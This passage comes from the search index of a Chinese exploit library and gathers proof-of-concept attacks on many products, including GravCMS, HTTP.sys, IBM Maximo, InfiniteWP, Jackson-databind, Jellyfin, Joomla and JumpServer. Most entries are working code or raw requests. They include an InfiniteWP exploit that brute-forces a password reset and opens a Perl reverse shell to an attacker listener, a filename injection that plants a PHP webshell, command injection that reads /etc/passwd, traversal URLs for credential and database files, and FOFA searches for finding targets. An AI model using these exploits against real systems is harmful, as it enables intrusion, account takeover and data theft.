\"last_commit\" values') csrf = extract_value(res, '_csrf') vprint_good(\"csrf=#{csrf}\") last_commit = extract_value(res, 'last_commit') vprint_good(\"last_commit=#{last_commit}\") http_post_request( uri, last_commit: last_commit, tree_path: filename, content: Rex::Text.rand_text_alpha(1..20), commit_summary: '', commit_message: '', commit_choice: 'direct', csrf: csrf, timeout: last_chunk ? 0 : 20 # The last one never returns, don't bother waiting ) vprint_status(\"#{filename} created\") nil end # Hook the HTTP client method to add specific cookie management logic def send_request_cgi(opts, timeout = 20) res = super return unless res # HTTP client does not handle cookies with the same name correctly. It adds # them instead of substituing the old value with the new one. unless res.get_cookies.empty? cookie_jar_hash = cookie_jar_to_hash cookies_from_response = cookie_jar_to_hash(res.get_cookies.split(' ')) cookie_jar_hash.merge!(cookies_from_response) cookie_jar_updated = cookie_jar_hash.each_with_object(Set.new) do |cookie, set| set ref： http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202010-720 https://nox.qianxin.com/vulnerability/detail/67108 https://packetstormsecurity.com/files/162123/gogs_git_hooks_rce.rb.txt Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/GravCMS未经身份验证的任意YAML写入-RCE（CVE-2021-21425）.html":{"url":"Edge_Security/GravCMS未经身份验证的任意YAML写入-RCE（CVE-2021-21425）.html","title":"GravCMS未经身份验证的任意YAML写入-RCE（CVE-2021-21425）","keywords":"","body":"GravCMS未经身份验证的任意YAML写入/RCE（CVE-2021-21425） 详情分析可以见：https://pentest.blog/unexpected-journey-7-gravcms-unauthenticated-arbitrary-yaml-write-update-leads-to-code-execution/ 任意YAML文件写入： 1 –访问hxxp://target/admin URL.。 2 –获取cookie并从登录表单中提取admin-nonce值。 3-执行以下POST请求。 POST /admin/config/site HTTP/1.1 HOST: target ... task=SavaDefault&data[title]=PWNED&admin-nonce=xxx rce： POST /admin/config/scheduler HTTP/1.1 Host: 192.168.179.131 Content-Length: 348 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://192.168.179.131 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://192.168.179.131/admin/forgot Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: grav-site-1dfbe94-admin=s2pca2cleqg78u8iit6v593h60 Connection: close task=SaveDefault&data%5Bcustom_jobs%5D%5Bmdisec21%5D%5Bcommand%5D=/usr/bin/echo &data%5Bcustom_jobs%5D%5Bmdisec21%5D%5Bargs%5D=1337 &data%5Bcustom_jobs%5D%5Bmdisec21%5D%5Bat%5D=*+*+*+*+* &data%5Bcustom_jobs%5D%5Bmdisec21%5D%5Boutput%5D=/tmp/1.txt &data%5Bcustom_jobs%5D%5Bmdisec21%5D%5Boutput_mode%5D=append &admin-nonce=b78bb0a12604579896f9b4796dde8833 ref: https://nvd.nist.gov/vuln/detail/CVE-2021-21425 https://github.com/getgrav/grav-plugin-admin/security/advisories/GHSA-6f53-6qgv-39pj https://pentest.blog/unexpected-journey-7-gravcms-unauthenticated-arbitrary-yaml-write-update-leads-to-code-execution/ Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/HTTP协议栈远程代码执行漏洞（CVE-2021-31166）.html":{"url":"Edge_Security/HTTP协议栈远程代码执行漏洞（CVE-2021-31166）.html","title":"HTTP协议栈远程代码执行漏洞（CVE-2021-31166）","keywords":"","body":"HTTP协议栈远程代码执行漏洞（CVE-2021-31166） 该漏洞存在于HTTP 协议栈 (http.sys) 的处理程序中，未经身份验证的远程攻击者可通过向目标主机发送特制数据包来进行利用，从而在目标系统上以内核身份执行任意代码。CVSS评分为9.8。 影响版本 Windows Server, version 20H2 (Server Core Installation) Windows 10 Version 20H2 for ARM64-based Systems Windows 10 Version 20H2 for 32-bit Systems Windows 10 Version 20H2 for x64-based Systems Windows Server, version 2004 (Server Core installation) Windows 10 Version 2004 for x64-based Systems Windows 10 Version 2004 for ARM64-based Systems Windows 10 Version 2004 for 32-bit Systems PoC.py: import requests import argparse def main(): parser = argparse.ArgumentParser('Poc for CVE-2021-31166: remote UAF in HTTP.sys') parser.add_argument('--target', required = True) args = parser.parse_args() r = requests.get(f'http://{args.target}/', headers = { 'Accept-Encoding': 'doar-e, ftw, imo, ,', }) print(r) main() ref: https://github.com/0vercl0k/CVE-2021-31166 http://blog.nsfocus.net/cve-2021-31166/ https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31166 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/IBM Maximo Asset Management XXE漏洞（CVE-2020-4463）.html":{"url":"Edge_Security/IBM Maximo Asset Management XXE漏洞（CVE-2020-4463）.html","title":"IBM Maximo Asset Management XXE漏洞（CVE-2020-4463）","keywords":"","body":"IBM Maximo Asset Management XXE漏洞（CVE-2020-4463） 在处理XML数据时，IBM Maximo Asset Management容易受到XML外部实体注入（XXE）攻击。远程攻击者可能利用此漏洞来泄露敏感信息或消耗内存资源。 受影响的核心组件： IBM Maximo资产管理7.6.0 IBM Maximo资产管理7.6.1 IBM Maximo资产管理7.6.0之前的所有版本 CVE-2020-4463-PoC： #!/usr/bin/python3 ############ # @Author Ibonok # # CVE-2020-4463 IBM Maximo XXE # # Do not use this in productiv enviroments. # For educational use only. # ############ from colorama import init, Fore, Style import sys import requests import argparse def dataeleak_example(url): # Mandatory Headers headers = {'Content-Type': 'application/xml'} basepath = \"/meaweb/os/mxperson\" # DUMP MXPERSON xml_query = \"\"\" \"\"\" print (requests.post(url + basepath, data=xml_query, headers=headers, verify=False).text) def xxe_example(url): # Mandatory Headers headers = {'Content-Type': 'application/xml'} basepath = \"/meaweb/os/mxperson\" # XXE Windows xml_query = \"\"\" ]> &xxe; \"\"\" print (requests.post(url + basepath, data=xml_query, headers=headers, verify=False).text) # XXE Linux xml_query = \"\"\" ]> &xxe; \"\"\" print (requests.post(url + basepath, data=xml_query, headers=headers, verify=False).text) def check_args (): init(autoreset=True) pars = argparse.ArgumentParser(description=Fore.GREEN + Style.BRIGHT + 'CVE-2020-4463 PoC Data Leakage and XXE' + Style.RESET_ALL) pars.add_argument('-x', '--xxe', nargs='?', type=str2bool, default=False, const=True, help='XXE (Linux/Windows)') pars.add_argument('-d', '--dataleak', nargs='?', type=str2bool, default=False, const=True, help='Data Leakage REST request MXPERSON. May take a long time.') pars.add_argument('--url', nargs='?', help='Target URL http://, https://') args = pars.parse_args() if args.url is None: pars.error(Fore.RED + '--url required') elif args.url and args.xxe is False and args.dataleak is False: pars.error(Fore.RED + '-x/-xxe, or -d/--dataleak is missing') elif args.url and args.xxe: return args.url, args.xxe, args.dataleak elif args.url and args.dataleak: return args.url, args.xxe, args.dataleak elif args.url and args.xxe and args.dataleak: pars.error(Fore.RED + 'To many Parameters, please check --help') def single_url(url, xxe, dataleak): if dataleak: dataeleak_example ( url) elif xxe: xxe_example ( url) else: sys.exit() def str2bool(v): if isinstance(v, bool): return v if v.lower() in ('yes', 'true', 't', 'y', '1'): return True elif v.lower() in ('no', 'false', 'f', 'n', '0'): return False else: raise argparse.ArgumentTypeError('Boolean value expected.') if __name__ == \"__main__\": try: (url, xxe, dataleak) = check_args() single_url(url, xxe, dataleak) except KeyboardInterrupt: sys.exit() 如果您收到以下响应，则两个漏洞均不存在。 Error 500: BMXAA1268E - No user credentials. ref： https://github.com/Ibonok/CVE-2020-4463 https://forum.ywhack.com/thread-114787-1-3.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/IBOS酷办公系统 后台命令执行.html":{"url":"Edge_Security/IBOS酷办公系统 后台命令执行.html","title":"IBOS酷办公系统 后台命令执行","keywords":"","body":"IBOS酷办公系统 后台命令执行 FOFA： body=\"IBOS\" && body=\"login-panel\" 利用条件 IBOS_4.5.5及以前的版本 需要具备后台登陆权限 PoC： 登录之后点击管理后台。 在后台管理中找到通用设置，在数据库的备份中选择更多选项，数据备份方式选择系统 MySQL Dump (Shell) 备份，然后提交。 拦截此数据包，修改其中的filename参数,会在根目录生成2021.php 2021%26echo \"\">2021%PATHEXT:~0,1%php%262021 via：xzuser@https://xz.aliyun.com/t/9115 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/IE 脚本引擎 jscript9.dll 内存损坏漏洞（CVE-2021-26419）.html":{"url":"Edge_Security/IE 脚本引擎 jscript9.dll 内存损坏漏洞（CVE-2021-26419）.html","title":"IE 脚本引擎 jscript9.dll 内存损坏漏洞（CVE-2021-26419）","keywords":"","body":"IE 脚本引擎 jscript9.dll 内存损坏漏洞（CVE-2021-26419） IE 脚本引擎存在远程代码执行漏洞，攻击者可通过诱导用户打开特制网站来利用此漏洞，从而在目标设备上执行任意代码。 poc见：https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26419 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Infinite WP管理面板中的身份验证绕过和RCE（CVE-2020-28642）.html":{"url":"Edge_Security/Infinite WP管理面板中的身份验证绕过和RCE（CVE-2020-28642）.html","title":"Infinite WP管理面板中的身份验证绕过和RCE（CVE-2020-28642）","keywords":"","body":"Infinite WP管理面板中的身份验证绕过和RCE（CVE-2020-28642） InfiniteWP是一个Web应用程序,允许您从一个仪表板管理多个WordPress站点。Infinite WP管理面板2.15.6及之前版本中存在身份验证绕过和RCE，可以使未经身份验证的用户能够通过身份验证，只需要知道系统中一个用户的电子邮件地址即可，就可以通过密码重置机制进行恶意利用。 受影响版本： 2.15.6及之前版本 Exploit.py: #!/usr/bin/env python3 # coding: utf8 # # exploit code for unauthenticated rce in InfiniteWP Admin Panel v2.15.6 # # tested on: # - InfiniteWP Admin Panel v2.15.6 released on August 10, 2020 # # the bug chain is made of two bugs: # 1. weak password reset token leads to privilege escalation # 2. rce patch from 2016 can be bypassed with same payload but lowercase # # example run: # $ ./iwp_rce.py -e 'a@b.c' -rh http://192.168.11.129/iwp -lh 192.168.11.1 # 2020-08-13 14:45:29,496 - INFO - initiating password reset... # 2020-08-13 14:45:29,537 - INFO - reset token has been generated at 1597322728, starting the bruteforce... # 2020-08-13 14:45:29,538 - INFO - starting with uid 1... # 2020-08-13 14:50:05,318 - INFO - tested 50000 (5.0%) hashes so far for uid 1... # 2020-08-13 14:54:49,094 - INFO - tested 100000 (10.0%) hashes so far for uid 1... # 2020-08-13 14:59:15,282 - INFO - tested 150000 (15.0%) hashes so far for uid 1... # 2020-08-13 15:04:19,933 - INFO - tested 200000 (20.0%) hashes so far for uid 1... # 2020-08-13 15:08:55,162 - INFO - tested 250000 (25.0%) hashes so far for uid 1... # 2020-08-13 15:13:38,524 - INFO - tested 300000 (30.0%) hashes so far for uid 1... # 2020-08-13 15:15:43,375 - INFO - password has been reset, you can now login using a@b.c:msCodWbsdxGGETswnmWJyANE/x2j6d9G # 2020-08-13 15:15:43,377 - INFO - removing from the queue all the remaining hashes... # 2020-08-13 15:15:45,431 - INFO - spawning a remote shell... # /bin/sh: 0: can't access tty; job control turned off # $ id # uid=1(daemon) gid=1(daemon) groups=1(daemon) # $ uname -a # Linux debian 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux # $ exit # *** Connection closed by remote host *** # # polict, 13/08/2020 import sys, time import requests from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) from concurrent.futures import as_completed from requests_futures.sessions import FuturesSession import logging import logging.handlers import datetime from argparse import ArgumentParser from hashlib import sha1 import socket import telnetlib from threading import Thread ### default settings DEFAULT_LPORT = 9111 DEFAULT_MICROS = 1000000 DEFAULT_NEW_PASSWORD = \"msCodWbsdxGGETswnmWJyANE/x2j6d9G\" PERL_REV_SHELL_TPL = \"perl -e 'use Socket;$i=\\\"%s\\\";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");open(STDERR,\\\">&S\\\");exec(\\\"/bin/sh -i\\\");};'\" ### argument parsing parser = ArgumentParser() parser.add_argument(\"-rh\", \"--rhost\", dest=\"rhost\", required=True, help=\"remote InfiniteWP Admin Panel webroot, e.g.: http://10.10.10.11:8080/iwp\") parser.add_argument(\"-e\", \"--email\", dest=\"email\", help=\"target email\", required=True) parser.add_argument(\"-u\", '--user-id', dest=\"uid\", help=\"user_id (in the default installation it is 1, if not set will try 1..5)\") parser.add_argument(\"-lh\", '--lhost', dest=\"lhost\", help=\"local ip to use for remote shell connect-back\", required=True) parser.add_argument(\"-ts\", '--token-timestamp', dest=\"start_ts\", help=\"the unix timestamp to use for the token bruteforce, e.g. 1597322728\") parser.add_argument(\"-m\", \"--micros\", dest=\"micros_elapsed\", help=\"number of microseconds to test (if not set 1000000 (1 second))\", default=DEFAULT_MICROS) parser.add_argument(\"-lp\", '--lport', dest=\"lport\", help=\"local port to use for remote shell connect-back\", default=DEFAULT_LPORT) parser.add_argument(\"-p\", '--new-password', dest=\"new_password\", help=\"new password (if not set will configure '{}')\".format(DEFAULT_NEW_PASSWORD), default=DEFAULT_NEW_PASSWORD) parser.add_argument(\"-d\", \"--debug\", dest=\"debug_mode\", action=\"store_true\", help=\"enable debug mode\") args = parser.parse_args() log = logging.getLogger(__name__) if args.debug_mode: log.setLevel(logging.DEBUG) else: log.setLevel(logging.INFO) handler = logging.StreamHandler(sys.stdout) handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')) log.addHandler(handler) ### actual exploit logic def init_pw_reset(): global args start_clock = time.perf_counter() start_ts = datetime.datetime.utcnow().replace(tzinfo=datetime.timezone.utc) log.debug(\"init pw reset start ts: {}\".format(start_ts)) response = requests.post(\"{}/login.php\".format(args.rhost), verify=False, data={ \"email\": args.email, \"action\": \"resetPasswordSendMail\", \"loginSubmit\": \"Send Reset Link\" }, allow_redirects=False) log.debug(\"init pw reset returned these headers: {}\".format(response.headers)) \"\"\" now we could use our registered timings to restrict the bruteforce values to the minimum range instead of using the whole \"last second\" microseconds range, however we can't be 100% sure the target server is actually NTP-synced just via the HTTP \"Date\" header, so let's skip it for now # calculate actual ntp-time range end_clock = time.perf_counter() # datetime.datetime.utcnow().replace(tzinfo=datetime.timezone.utc) delta_clock = end_clock - start_clock end_ts = start_ts + datetime.timedelta(seconds=delta_clock) log.debug(\"end: {}\".format(end_ts)) print(\"delta clock {} -- end ts {} timestamp: {}\".format(delta_clock, end_ts, end_ts.timestamp())) # this takes for garanteed that the response arrives before 1 minute is elapsed micros_elapsed = delta_ts.seconds * 1000000 + delta_ts.microseconds log.debug(\"micros elapsed: {}\".format(micros_elapsed)) \"\"\" if response.status_code == 302 and \"resetPasswordEmailNotFound\" in response.headers['location']: log.error(\"the input email is not registered in the target Infinite WP Admin Panel, retry with another one\") sys.exit(1) # both redirects are ok because the reset hash is written in the db before sending the mail if response.status_code == 302 \\ and (response.headers[\"location\"] == 'login.php?successMsg=resetPasswordMailSent' \\ or response.headers[\"location\"] == 'login.php?view=resetPassword&errorMsg=resetPasswordMailError'): # Date: Tue, 11 Aug 2020 09:59:38 GMT --> dt obj server_dt = datetime.datetime.strptime(response.headers[\"date\"], '%a, %d %b %Y %H:%M:%S GMT') server_dt = server_dt.replace(tzinfo=datetime.timezone.utc) log.debug(\"server time: {}\".format(server_dt)) \"\"\" this could be a bruteforce optimization, however it is not 100% reliable as mentioned earlier if (end_ts - server_dt) > datetime.timedelta(milliseconds=500): log.warning(\"the target server doesn't look ntp-synced, exploit will most probably fail\") \"\"\" args.start_ts = int(server_dt.timestamp()) # args.micros_elapsed = 1000000 return else: log.error(\"pw reset init failed, check with debug enabled (-d)\") sys.exit(1) def generate_reset_hash(timestamp, uid): global args \"\"\" $hashValue = serialize(array('hashCode' => 'resetPassword', 'uniqueTime' => microtime(true), 'userPin' => $userDets['userID'])); ^ e.g. a:3:{s:8:\"hashCode\";s:13:\"resetPassword\";s:10:\"uniqueTime\";d:1597143127.445164;s:7:\"userPin\";s:1:\"1\";} $resetHash = sha1($hashValue); \"\"\" template_ts_uid = \"a:3:{s:8:\\\"hashCode\\\";s:13:\\\"resetPassword\\\";s:10:\\\"uniqueTime\\\";d:%s;s:7:\\\"userPin\\\";s:1:\\\"%s\\\";}\" # a:3:{s:8:\"hashCode\";s:13:\"resetPassword\";s:10:\"uniqueTime\";d:1597167784.175625;s:7:\"userPin\";s:1:\"1\";} serialized_resethash = template_ts_uid %(timestamp, uid) hash_obj = sha1(serialized_resethash.encode()) reset_hash = hash_obj.hexdigest() log.debug(\"serialized reset_hash: {} -- sha1: {}\".format(serialized_resethash, reset_hash)) return reset_hash def brute_pw_reset(): global args, start_time if args.uid is None: # in the default installation the uid is 1, but let's try also some others in case they have installed # the \"manage-users\" addon: https://infinitewp.com/docs/addons/manage-users/ uids = [1,2,3,4,5] else: uids = [args.uid] log.debug(\"using uids: {} -- start ts {}\".format(uids, args.start_ts)) sha1_email = sha1(args.email.encode()).hexdigest() with FuturesSession() as session: # max_workers=4 for uid in uids: log.info(\"starting with uid {}...\".format(uid)) microsecond = 0 hashes_tested = 0 while microsecond 0: log.info(\"tested {} ({}%) hashes so far for uid {}...\".format(hashes_tested, int((hashes_tested/args.micros_elapsed)*100), uid)) hashes_tested += 1 response = future.result() log.debug(\"response status code {} - location {}\".format(response.status_code, response.headers[\"location\"])) if \"successMsg\" in response.headers[\"location\"] : log.info(\"password has been reset, you can now login using {}:{}\".format(args.email, args.new_password)) log.info(\"removing from the queue all the remaining hashes...\") for future in futures: future.cancel() return log.info(\"target user doesn't have uid {}...\".format(uid)) log.error(\"just finished testing all {} hashes, the exploit has failed\".format(hashes_tested)) sys.exit(1) def handler(): global args t = telnetlib.Telnet() s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((\"0.0.0.0\", args.lport)) s.listen(1) conn, addr = s.accept() log.debug(\"Connection from %s %s received!\" % (addr[0], addr[1])) t.sock = conn t.interact() def login_and_rce(): global args handlerthr = Thread(target=handler) handlerthr.start() # login and record cookies s = requests.Session() log.debug(\"logging in...\") login = s.post(\"{}/login.php\".format(args.rhost), data={\"email\": args.email, \"password\": args.new_password, \"loginSubmit\": \"Log in\"}) log.debug(\"login ret {} headers {}\".format(login.status_code, login.headers)) # rce rce = s.get(\"{}/ajax.php\".format(args.rhost), params={\"action\": \"polict\", # notice the lowercase f # (bypass of patch for https://packetstormsecurity.com/files/138668/WordPress-InfiniteWP-Admin-Panel-2.8.0-Command-Injection.html) \"requiredData[addfunctions]\" : \"system\", \"requiredData[system]\": PERL_REV_SHELL_TPL % (args.lhost, args.lport) }) log.debug(\"rce ret {} headers {}\".format(rce.status_code, rce.headers)) if __name__ == '__main__': if args.start_ts is None: log.info(\"initiating password reset...\") init_pw_reset() log.info(\"reset token has been generated at {}, starting the bruteforce...\".format(args.start_ts)) brute_pw_reset() log.info(\"spawning a remote shell...\") login_and_rce() ref: https://forum.ywhack.com/thread-114867-1-1.html https://ssd-disclosure.com/ssd-advisory-auth-bypass-and-rce-in-infinite-wp-admin-panel/ Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Internet Explorer内存损坏漏洞（CVE-2021-26411）.html":{"url":"Edge_Security/Internet Explorer内存损坏漏洞（CVE-2021-26411）.html","title":"Internet Explorer内存损坏漏洞（CVE-2021-26411）","keywords":"","body":"Internet Explorer内存损坏漏洞（CVE-2021-26411） Interne Explorer在处理DOM对象时，存在一处double free漏洞，攻击者可通过诱导用户点击恶意链接或文件来利用此漏洞，此漏洞可导致远程代码执行，从而使攻击者控制用户系统。该漏洞细节已公开，并检测到在野利用。 漏洞详情可以参考：https://iamelli0t.github.io/2021/03/12/CVE-2021-26411.html PoC： var elem = document.createElement('xxx'); var attr1 = document.createAttribute('yyy'); var attr2 = document.createAttribute('zzz'); var obj = {}; obj.valueOf = function() { elem.clearAttributes(); return 0x1337; }; attr1.nodeValue = obj; attr2.nodeValue = 123; elem.setAttributeNode(attr1); elem.setAttributeNode(attr2); elem.removeAttributeNode(attr1); ref： https://msrc.microsoft.com/updat ... lity/CVE-2021-26411 https://nvd.nist.gov/vuln/detail/CVE-2021-26411 https://iamelli0t.github.io/2021/03/12/CVE-2021-26411.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Ivanti Avalanche 目录遍历漏洞.html":{"url":"Edge_Security/Ivanti Avalanche 目录遍历漏洞.html","title":"Ivanti Avalanche 目录遍历漏洞","keywords":"","body":"Ivanti Avalanche 目录遍历漏洞 Ivanti Avalanche是一种移动设备管理系统。Ivanti Avalanche中的一个漏洞允许未经身份验证的远程用户请求位于“ image”文件夹之外的文件。 影响版本： Windows v6.3.2.3490 的 Avalanche Premise 6.3.2 PoC： 数据库读取： https://EXAMPLE_IP:8443/AvalancheWeb/image?imageFilePath=C:/Program Files/Microsoft SQL Server/MSSQL11.SQLEXPRESS/MSSQL/DATA/Avalanche.mdf 其它： https://EXAMPLE_IP:8443/AvalancheWeb/image?imageFilePath=C:/Windows/system32/config/system.sav https://EXAMPLE_IP:8443/AvalancheWeb/image?imageFilePath=C:/sysprep/sysprep.inf ref： https://ssd-disclosure.com/ssd-advisory-ivanti-avalanche-directory-traversal/ Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Jackson-databind RCE（CVE-2020-35728）.html":{"url":"Edge_Security/Jackson-databind RCE（CVE-2020-35728）.html","title":"Jackson-databind RCE（CVE-2020-35728）","keywords":"","body":"Jackson-databind RCE（CVE-2020-35728） 由于com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool组件库存在不安全的反序列化，导致攻击者可以利用漏洞实现远程代码执行。 pom.xml： 4.0.0 com.jacksonTest jacksonTest 1.0-SNAPSHOT com.fasterxml.jackson.core jackson-databind 2.9.10.7 org.glassfish.web jakarta.servlet.jsp.jstl 2.0.0 org.slf4j slf4j-nop 1.7.2 javax.transaction jta 1.1 poc.java import com.fasterxml.jackson.databind.ObjectMapper; public class POC { public static void main(String[] args) throws Exception { String payload = \"[\\\"com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool\\\",{\\\"jndiPath\\\":\\\"ldap://127.0.0.1:1088/Exploit\\\"}]\"; ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); Object obj = mapper.readValue(payload, Object.class); mapper.writeValueAsString(obj); } } ref: https://github.com/Al1ex/CVE-2020-35728 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/JD-FreeFuck 后台命令执行漏洞.html":{"url":"Edge_Security/JD-FreeFuck 后台命令执行漏洞.html","title":"JD-FreeFuck 后台命令执行漏洞","keywords":"","body":"JD-FreeFuck 后台命令执行漏洞 JD-FreeFuck 存在后台命令执行漏洞，由于传参执行命令时没有对内容过滤，导致可以执行任意命令，控制服务器 项目地址：https://github.com/meselson/JD-FreeFuck FOFA: title=\"京东薅羊毛控制面板\" 默认账号密码为 useradmin/supermanito PoC： POST /runCmd HTTP/1.1 Host: 101.200.189.251:5678 Content-Length: 50 Pragma: no-cache Cache-Control: no-cache Accept: */* X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: connect.0.6356777726800276=s%3Av1W6DxlSqnPpVgvMCItxElFeKI1Psh4i.eE4ORs0Yz30N0TOg1pUVpOqrpIHyrqIimuXJVO8lE7U Connection: close cmd=bash+jd.sh+%3Bcat /etc/passwd%3B+now&delay=500 from：https://mp.weixin.qq.com/s/MEcuSnroUh6z3wp9Mi_OkA Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/JEEWMS 未授权任意文件读取漏洞.html":{"url":"Edge_Security/JEEWMS 未授权任意文件读取漏洞.html","title":"JEEWMS 未授权任意文件读取漏洞","keywords":"","body":"JEEWMS 未授权任意文件读取漏洞 厦门市灵鹿谷科技有限公司 JEEWMS /systemController/showOrDownByurl.do文件 存在未授权任意文件读取漏洞,攻击者可利用该漏洞获取服务器文件,导致大量敏感信息泄露. http://target/systemController/showOrDownByurl.do?down=&dbPath=../Windows/win.ini http://target/systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd ref: https://poc.shuziguanxing.com/#/publicIssueInfo#issueId=4033 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Jellyfin 任意文件读取（CVE-2021-21402）.html":{"url":"Edge_Security/Jellyfin 任意文件读取（CVE-2021-21402）.html","title":"Jellyfin 任意文件读取（CVE-2021-21402）","keywords":"","body":"Jellyfin 任意文件读取（CVE-2021-21402） Jellyfin是一个免费软件媒体系统。在10.7.1版之前的Jellyfin中，带有某些终结点的精心设计的请求将允许从Jellyfin服务器的文件系统中读取任意文件。 fofa： title=\"Jellyfin\" 任意文件读取： //以下请求jellyfin.db将从服务器下载带有密码的数据库 GET /Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/ HTTP/1.1 GET /Videos/anything/hls/m/..%5Cdata%5Cjellyfin.db HTTP/1.1 ref： https://nvd.nist.gov/vuln/detail/CVE-2021-21402 https://securitylab.github.com/advisories/GHSL-2021-050-jellyfin/ https://forum.ywhack.com/thread-115353-1-7.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/jinja服务端模板注入漏洞.html":{"url":"Edge_Security/jinja服务端模板注入漏洞.html","title":"jinja服务端模板注入漏洞","keywords":"","body":"jinja服务端模板注入漏洞 程序使用了jinja2的某个渲染函数 比如render_template_string，且存在可控输入点，可造成命令执行漏洞。 详情可以参考这篇文章：https://secure-cookie.io/attacks/ssti/#what-is-template 输入 49 看是否输出 49 利用方式可以参考：https://secure-cookie.io/attacks/ssti/#how-is-that-exploitable Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Joomla CMS 框架 ACL 安全访问控制漏洞（CVE-2020-35616）.html":{"url":"Edge_Security/Joomla CMS 框架 ACL 安全访问控制漏洞（CVE-2020-35616）.html","title":"Joomla CMS 框架 ACL 安全访问控制漏洞（CVE-2020-35616）","keywords":"","body":"Joomla CMS 框架 ACL 安全访问控制漏洞（CVE-2020-35616） POST请求表单中的ACL规则集的格式： jform[rules][core.PERMISSION][GROUP_ID] jform[rules][core.delete][ID] jform[rules][core.edit][ID] jform[rules][core.edit.state][ID] jform[rules][core.edit.own][ID] 如果将这些POST请求参数设置为值1，则基本上将这些特定权限设置为Allowed \bPoC: POST administrator/index.php?option={Target Category} ... ... ... &jform[rules][core.{create|delete|edit}][AttackerID]=1 如上所述，我们希望向组ID为7的管理员授予所有权限。因此，在保存表单时，我们需要附加以下POST数据： &jform[rules][core.create][7]=1&jform[rules][core.delete][7]=1&jform[rules][core.edit][7]=1&jform[rules][core.edit.state][7]=1&jform[rules][core.edit.own][7]=1 PoC验证视频： https://youtu.be/AZr6WydbUA0 详细分析文章见：https://blog.securelayer7.net/latest-joomla-exploit-cve-2020-35616-acl-security-vulnerabilities/ Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/JumpServer远程执行漏洞.html":{"url":"Edge_Security/JumpServer远程执行漏洞.html","title":"JumpServer远程执行漏洞","keywords":"","body":"JumpServer远程执行漏洞 JumpServer 是全球首款完全开源的堡垒机, 使用GNU GPL v2.0 开源协议, 是符合4A 的专业运维审计系统。 JumpServer 使用Python / Django 进行开发。2021年1月15日，阿里云应急响应中心监控到开源堡垒机JumpServer发布更新，修复了一处远程命令执行漏洞。由于 JumpServer 某些接口未做授权限制，攻击者可构造恶意请求获取敏感信息，或者执行相关操作控制其中所有机器，执行任意命令。 安装脚本V2.6.1 https://www.o2oxy.cn/wp-content/uploads/2021/01/quick_start.zip PS:安装的时候全选NO 安全完成后至安装目录手动启动。 详细复现文章见：https://www.o2oxy.cn/2921.html POC.py: # -*- coding: utf-8 -*- # import requests # import json # data={\"user\":\"4320ce47-e0e0-4b86-adb1-675ca611ea0c\",\"asset\":\"ccb9c6d7-6221-445e-9fcc-b30c95162825\",\"system_user\":\"79655e4e-1741-46af-a793-fff394540a52\"} # # url_host='http://192.168.1.73:8080' # # def get_token(): # url = url_host+'/api/v1/users/connection-token/?user-only=1' # url =url_host+'/api/v1/authentication/connection-token/?user-only=1' # response = requests.post(url, json=data).json() # print(response) # ret=requests.get(url_host+'/api/v1/authentication/connection-token/?token=%s'%response['token']) # print(ret.text) # get_token() import asyncio import websockets import requests import json url = \"/api/v1/authentication/connection-token/?user-only=None\" # 向服务器端发送认证后的消息 async def send_msg(websocket,_text): if _text == \"exit\": print(f'you have enter \"exit\", goodbye') await websocket.close(reason=\"user exit\") return False await websocket.send(_text) recv_text = await websocket.recv() print(f\"{recv_text}\") # 客户端主逻辑 async def main_logic(cmd): 